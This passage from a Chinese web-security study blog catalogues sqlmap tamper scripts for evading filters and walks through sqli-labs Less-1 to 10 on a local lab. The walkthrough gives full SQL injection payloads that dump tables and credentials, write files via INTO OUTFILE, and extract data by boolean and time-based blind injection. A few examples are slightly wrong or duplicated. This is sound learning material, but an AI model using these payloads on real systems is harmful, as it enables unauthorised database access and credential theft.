作用：替换为base64编码<br>
使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>
使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p>
</li>
<li>
<p><a href="http://multiplespaces.py">multiplespaces.py</a><br>
适用数据库：ALL<br>
作用：围绕sql关键字添加多个空格<br>
使用脚本前：tamper(‘1 UNION SELECT foobar’)<br>
使用脚本后：1 UNION SELECT foobar</p>
</li>
<li>
<p><a href="http://space2plus.py">space2plus.py</a><br>
适用数据库：ALL<br>
作用：用加号替换空格<br>
使用脚本前：tamper(‘SELECT id FROM users’)<br>
使用脚本后：SELECT+id+FROM+users</p>
</li>
<li>
<p><a href="http://nonrecursivereplacement.py">nonrecursivereplacement.py</a><br>
适用数据库：ALL<br>
作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将<br>
select替换为空）<br>
使用脚本前：tamper(‘1 UNION SELECT 2–’)<br>
使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p>
</li>
<li>
<p><a href="http://space2randomblank.py">space2randomblank.py</a><br>
适用数据库：ALL<br>
作用：将空格替换为其他有效字符<br>
使用脚本前：tamper(‘SELECT id FROM users’)<br>
使用脚本后：SELECT%0Did%0DFROM%0Ausers</p>
</li>
<li>
<p><a href="http://unionalltounion.py">unionalltounion.py</a><br>
适用数据库：ALL<br>
作用：将union allselect 替换为unionselect<br>
使用脚本前：tamper(’-1 UNION ALL SELECT’)<br>
使用脚本后：-1 UNION SELECT</p>
</li>
<li>
<p><a href="http://securesphere.py">securesphere.py</a><br>
适用数据库：ALL<br>
作用：追加特定的字符串<br>
使用脚本前：tamper(‘1 AND 1=1’)<br>
使用脚本后：1 AND 1=1 and ‘0having’=‘0having’</p>
</li>
<li>
<p><a href="http://space2dash.py">space2dash.py</a><br>
适用数据库：ALL<br>
作用：将空格替换为–，并添加一个随机字符串和换行符<br>
使用脚本前：tamper(‘1 AND 9227=9227’)<br>
使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p>
</li>
<li>
<p><a href="http://space2mssqlblank.py">space2mssqlblank.py</a><br>
适用数据库：Microsoft SQL Server<br>
测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>
作用：将空格随机替换为其他空格符号(’%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’,<br>
‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>
使用脚本前：tamper(‘SELECT id FROM users’)<br>
使用脚本后：SELECT%0Eid%0DFROM%07users</p>
</li>
<li>
<p><a href="http://percentage.py">percentage.py</a><br>
适用数据库：ASP<br>
测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL<br>
9.0<br>
作用：在每个字符前添加一个%<br>
使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br>
使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>
</li>
<li>
<p>sp_password.py<br>
适用数据库：MSSQL<br>
作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>
使用脚本前：tamper('1 AND 9227=9227-- ')<br>
使用脚本后：1 AND 9227=9227-- sp_password</p>
</li>
<li>
<p><a href="http://charencode.py">charencode.py</a><br>
测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、<br>
PostgreSQL 8.3, 8.4, 9.0<br>
作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>
使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>
使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
</li>
<li>
<p><a href="http://randomcase.py">randomcase.py</a><br>
测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、<br>
PostgreSQL 8.3, 8.4, 9.0<br>
作用：随机大小写<br>
使用脚本前：tamper(‘INSERT’)<br>
使用脚本后：INseRt</p>
</li>
<li>
<p><a href="http://charunicodeencode.py">charunicodeencode.py</a><br>
适用数据库：ASP、<a href="http://ASP.NET">ASP.NET</a><br>
测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>
作用：适用字符串的unicode编码<br>
使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br>
使用脚本后：<br>
%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u<br>
0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>
</li>
<li>
<p><a href="http://space2comment.py">space2comment.py</a><br>
测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>
作用：将空格替换为/**/<br>
使用脚本前：tamper(‘SELECT id FROM users’)<br>
使用脚本后：SELECT/**/id/**/FROM/**/users</p>
</li>
<li>
<p><a href="http://equaltolike.py">equaltolike.py</a><br>
测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>
作用：将=替换为LIKE<br>
使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)<br>
使用脚本后：SELECT * FROM users WHERE id LIKE 1</p>
</li>
<li>
<p><a href="http://equaltolike.py">equaltolike.py</a><br>
测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>
作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br>
使用脚本前：tamper(‘1 AND A &gt; B’)<br>
使用脚本后：1 AND GREATEST(A,B+1)=A</p>
</li>
<li>
<p><a href="http://ifnull2ifisnull.py">ifnull2ifisnull.py</a><br>
适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>
测试通过数据库：MySQL 5.0 and 5.5<br>
作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br>
使用脚本前：tamper(‘IFNULL(1, 2)’)<br>
使用脚本后：IF(ISNULL(1),2,1)</p>
</li>
<li>
<p><a href="http://modsecurityversioned.py">modsecurityversioned.py</a><br>
适用数据库：MySQL<br>
测试通过数据库：MySQL 5.0<br>
作用：过滤空格，使用mysql内联注释的方式进行注入<br>
使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>
使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–</p>
</li>
<li>
<p><a href="http://space2mysqlblank.py">space2mysqlblank.py</a><br>
适用数据库：MySQL<br>
测试通过数据库：MySQL 5.1<br>
作用：将空格替换为其他空格符号(’%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br>
使用脚本前：tamper(‘SELECT id FROM users’)<br>
使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p>
</li>
<li>
<p><a href="http://modsecurityzeroversioned.py">modsecurityzeroversioned.py</a><br>
适用数据库：MySQL<br>
测试通过数据库：MySQL 5.0<br>
作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br>
使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>
使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p>
</li>
<li>
<p><a href="http://space2mysqldash.py">space2mysqldash.py</a><br>
适用数据库：MySQL、MSSQL<br>
作用：将空格替换为 – ，并追随一个换行符<br>
使用脚本前：tamper(‘1 AND 9227=9227’)<br>
使用脚本后：1–%0AAND–%0A9227=9227</p>
</li>
<li>
<p><a href="http://bluecoat.py">bluecoat.py</a><br>
适用数据库：Blue Coat SGOS<br>
测试通过数据库：MySQL 5.1,、SGOS<br>
作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br>
使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br>
使用脚本后：SELECT%09id FROM users where id LIKE 1</p>
</li>
<li>
<p><a href="http://versionedkeywords.py">versionedkeywords.py</a><br>
适用数据库：MySQL<br>
测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>
作用：注释绕过<br>
使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL,<br>
CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS<br>
CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br>
使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,<br>
CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(<br>
32)),CHAR(58,100,114,117,58))#</p>
</li>
<li>
<p><a href="http://halfversionedmorekeywords.py">halfversionedmorekeywords.py</a><br>
适用数据库：MySQL &lt; 5.1<br>
测试通过数据库：MySQL 4.0.18/5.0.22<br>
作用：在每个关键字前添加mysql版本注释<br>
使用脚本前：tamper(“value’ UNION ALL SELECT<br>
CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS<br>
CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa”)<br>
使用脚本后：<br>
value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNUL<br>
L(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58<br>
)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’='QDWa</p>
</li>
<li>
<p><a href="http://space2morehash.py">space2morehash.py</a><br>
适用数据库：MySQL &gt;= 5.1.13<br>
测试通过数据库：MySQL 5.1.41<br>
作用：将空格替换为#，并添加一个随机字符串和换行符<br>
使用脚本前：tamper(‘1 AND 9227=9227’)<br>
使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p>
</li>
<li>
<p><a href="http://apostrophenullencode.py">apostrophenullencode.py</a><br>
适用数据库：ALL<br>
作用：用非法双字节Unicode字符替换单引号<br>
使用脚本前：tamper(“1 AND ‘1’='1”)<br>
使用脚本后：1 AND %00%271%00%27=%00%271</p>
</li>
<li>
<p><a href="http://appendnullbyte.py">appendnullbyte.py</a><br>
适用数据库：ALL<br>
作用：在有效载荷的结束位置加载null字节字符编码<br>
使用脚本前：tamper(‘1 AND 1=1’)<br>
使用脚本后：1 AND 1=1%00</p>
</li>
<li>
<p><a href="http://chardoubleencode.py">chardoubleencode.py</a><br>
适用数据库：ALL<br>
作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>
使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>
使用脚本后： %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F<br>
%254D%2520%2554%2541%2542%254C%2545</p>
</li>
<li>
<p><a href="http://unmagicquotes.py">unmagicquotes.py</a><br>
适用数据库：ALL<br>
作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br>
使用脚本前：tamper(“1’ AND 1=1”)<br>
使用脚本后：1%bf%27 AND 1=1–</p>
</li>
<li>
<p><a href="http://randomcomments.py">randomcomments.py</a><br>
适用数据库：ALL<br>
作用：用注释符分割sql关键字<br>
使用脚本前：tamper(‘INSERT’)<br>
使用脚本后：I/<strong>/N/</strong>/SERT</p>
</li>
</ol>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之sqli-labs手工注入——Basic-Challenge</title>
    <url>/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge/</url>
    <content><![CDATA[<h1 id="Web安全学习之sqli-labs手工注入——Basic-Challenge">Web安全学习之sqli-labs手工注入——Basic-Challenge</h1>
<p>SQL注入中的大名鼎鼎的sqli-labs闯关，根据网上现有的教程再加上自己的实践，记录一下闯关过程。这一篇是Basic-Challenge阶段的题目。</p>
<h3 id="Less-1-基于错误的GET单引号字符型注入">Less-1 基于错误的GET单引号字符型注入</h3>
<h4 id="判断注入类型">判断注入类型</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39;     &#x2F;&#x2F;报错</span><br></pre></td></tr></table></figure>
<p>相当于执行SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;1&#39;&#39;;</span><br></pre></td></tr></table></figure>
<p>那是因为我们之前的语句闭合了前面的<code>'</code>，而后面单一个<code>'</code>，所以会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1    &#x2F;&#x2F;正常</span><br></pre></td></tr></table></figure>
<p>相当于执行SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;;</span><br></pre></td></tr></table></figure>
<h4 id="判断列数">判断列数</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%203%20--+ &#x2F;&#x2F;正常</span><br><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%204%20--+ &#x2F;&#x2F;报错</span><br></pre></td></tr></table></figure>
<p>可以看出总共有三列，结合union查询。</p>
<h4 id="爆库payload">爆库payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,database()%20--+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意这里必须取一个id不存在的数字，例如-1</p>
</blockquote>
<p>相当于执行SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,database() -- &#39;limit 1,2;</span><br></pre></td></tr></table></figure>
<h4 id="爆表payload">爆表payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20--+</span><br></pre></td></tr></table></figure>
<p>相当于执行SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(table_name) from information_schema.table where table_schema&#x3D;database() -- limit 1,2;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>group_concat()</code>函数把来自多行的数据连接到一个字段当中。</p>
</blockquote>
<h4 id="爆字段名payload">爆字段名payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20--+</span><br></pre></td></tr></table></figure>
<p>相当于执行SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(column_name) from information_schema.column where table_name&#x3D;&#39;users&#39; -- limit 1,2;</span><br></pre></td></tr></table></figure>
<h4 id="爆值payload">爆值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,group_concat(username,0x3a,password)%20from%20users--+</span><br></pre></td></tr></table></figure>
<p>相当于SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D; &#39;0&#39; union select 1,2,group_concat(user, 0x3a, password) from users -- &#39;limit 1,2;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。</p>
</blockquote>
<h3 id="Less-2-基于错误的GET单引号字符型注入">Less-2 基于错误的GET单引号字符型注入</h3>
<h4 id="判断注入类型-v2">判断注入类型</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+</span><br></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+</span><br></pre></td></tr></table></figure>
<p>不报错</p>
<p>说明这里接收的<code>id</code>参数类型为 <code>int</code> 型，也就是没有 <code>'</code> 去闭合。</p>
<p>其他步骤与Less1类似，在此不再赘述。</p>
<h3 id="Less-3-基于错误的GET单引号变形字符型注入">Less-3 基于错误的GET单引号变形字符型注入</h3>
<h4 id="判断注入类型-v3">判断注入类型</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27</span><br></pre></td></tr></table></figure>
<p>报错信息如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>有一个括号，所以尝试闭合一下括号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1)%20and%201&#x3D;1%20--+</span><br></pre></td></tr></table></figure>
<p>正确显示信息。</p>
<p>其他步骤与Less1类似，在此不再赘述。</p>
<h3 id="Less-4-基于错误的GET双引号字符型注入">Less-4 基于错误的GET双引号字符型注入</h3>
<h4 id="判断注入类型-v4">判断注入类型</h4>
<p>先使用单引号闭合：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27</span><br></pre></td></tr></table></figure>
<p>报错信息如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>尝试使用<code>&quot;&quot;)</code>闭合：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-4&#x2F;?id&#x3D;1%22)%20--+</span><br></pre></td></tr></table></figure>
<p>其他步骤与Less1类似，在此不再赘述。</p>
<h3 id="Less-5-双注入GET单引号字符型注入">Less-5 双注入GET单引号字符型注入</h3>
<p>关于双注入的形成和理解，我单独写了另外一篇博文，可以移步<a href="https://ca0y1h.top/2019/09/17/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">至此</a>。</p>
<h4 id="爆库payload："><strong>爆库payload：</strong></h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<p>注意，由于有随机性，可能成功执行了语句所以不会报错，正常的显示页面（即不报错）。</p>
<h4 id="爆列名payload"><strong>爆列名payload:</strong></h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;??id&#x3D;-1&#39; union select count(*),1, concat((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
<h4 id="爆字段payload："><strong>爆字段payload：</strong></h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<p>修改limit x,1 可以显示第x个用户的password和username。</p>
<h3 id="Less-6-双注入GET双引号字符型注入">Less-6 双注入GET双引号字符型注入</h3>
<p>双引号字符型注入，上一题的单引号改成双引号就可以了。</p>
<h3 id="Less-7-导出文件GET字符型注入">Less-7 导出文件GET字符型注入</h3>
<p><a href="https://bbs.pediy.com/thread-219176.htm">详细题解</a></p>
<p>这道题最开始使用单引号闭合发现会有语法错误，只能经过不断大量的尝试，最后才能确定以下查询语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) --+</span><br></pre></td></tr></table></figure>
<p>确定语法正确后，可以开始编写payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+</span><br></pre></td></tr></table></figure>
<h4 id="爆库payload-v2">爆库payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,database() into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+</span><br></pre></td></tr></table></figure>
<h4 id="爆表payload-v2">爆表payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; database() into outfile &quot;&#x2F;tmp&#x2F;hack2.txt&quot; --+</span><br></pre></td></tr></table></figure>
<h4 id="爆字段名payload-v2">爆字段名payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; into outfile &quot;&#x2F;tmp&#x2F;hack3.txt&quot; --+</span><br></pre></td></tr></table></figure>
<h3 id="Less-8-布尔型单引号GET盲注">Less-8 布尔型单引号GET盲注</h3>
<h4 id="判断注入类型-v5">判断注入类型</h4>
<p>首先尝试<code>?id=1</code>，发现可以正常回显。再使用嵌入单引号<code>?id=1'</code>，发现不能正常回显，也没有任何错误消息。只好通过盲注来验证，该注入查询返回的一定是True或False。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
<p>对应MySQL语句是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * from table_name WHERE id&#x3D;1&#39; AND 1&#x3D;1</span><br></pre></td></tr></table></figure>
<p>由回显的结果可知该查询是有效的。</p>
<p>接着下一条查询：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;0 --+</span><br></pre></td></tr></table></figure>
<p>对应的MySQL语句是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * from table_name WHERE id&#x3D;&#39;1&#39; AND 1&#x3D;0</span><br></pre></td></tr></table></figure>
<p>同样的，数据库会对给定的情况1=0进行检查，显然该查询无效的，因此将会返回FALSE。</p>
<p>以上即可说明该数据库是可被盲注的。</p>
<h4 id="数据库名的长度payload">数据库名的长度payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+</span><br></pre></td></tr></table></figure>
<h4 id="数据库名的值payload">数据库名的值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr(database(),1,1)))&#x3D;115 --+</span><br></pre></td></tr></table></figure>
<p>其余依次类推，只需要改变<code>substr</code>函数的第二个参数即可。</p>
<h4 id="表名的长度payload">表名的长度payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)))&#x3D;5 --+</span><br></pre></td></tr></table></figure>
<h4 id="表名的值payload">表名的值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1), 1, 1)))&#x3D;117 --+</span><br></pre></td></tr></table></figure>
<p>其余依次类推，只需要改变<code>substr</code>函数的第二个参数即可。</p>
<h4 id="字段名的长度payload">字段名的长度payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1)))&#x3D;8 --+</span><br></pre></td></tr></table></figure>
<h4 id="字段的值payload">字段的值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),1,1)))&#x3D;117 --+</span><br></pre></td></tr></table></figure>
<p>其余依次类推，只需要改变<code>substr</code>函数的第二个参数即可。</p>
<h3 id="Less-9-基于时间的GET单引号盲注">Less-9 基于时间的GET单引号盲注</h3>
<p>基于时间的盲注和基于布尔类型的盲注原理上差异不大，只是在判断是否正确时，前者是看是否有明显的延迟，后者是看是否有回显。</p>
<h4 id="判断注入类型-v6">判断注入类型</h4>
<p>不管怎么输入，回显总是you are …，考虑时间型盲注：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(3) --+</span><br></pre></td></tr></table></figure>
<p>发现明显延迟，说明注入成功。</p>
<h4 id="数据库名的长度payload-v2">数据库名的长度payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8, sleep(3), 1) --+</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>if(exp1, exp2, exp3)</code>：如果exp1是True，则返回exp2；否则返回exp3。</p>
</blockquote>
<h4 id="数据库名的值payload-v2">数据库名的值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left(database(), 8)&#x3D;&#39;security&#39;, sleep(3), 1) --+</span><br></pre></td></tr></table></figure>
<h4 id="表名的值payload-v2">表名的值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),1)&#x3D;&#39;u&#39;, sleep(3), 1) --+</span><br></pre></td></tr></table></figure>
<h4 id="字段的值payload-v2">字段的值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1), 8)&#x3D;&#39;username&#39;, sleep(3), 1) --+</span><br></pre></td></tr></table></figure>
<h4 id="数据的值payload">数据的值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(left((select password from users order by id limit 0,1), 4)&#x3D;&#39;dumb&#39;, sleep(3), 1) --+</span><br></pre></td></tr></table></figure>
<h3 id="Less-10-基于时间的GET双引号盲注">Less-10 基于时间的GET双引号盲注</h3>
<p>基于时间的双引号盲注，只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。</p>
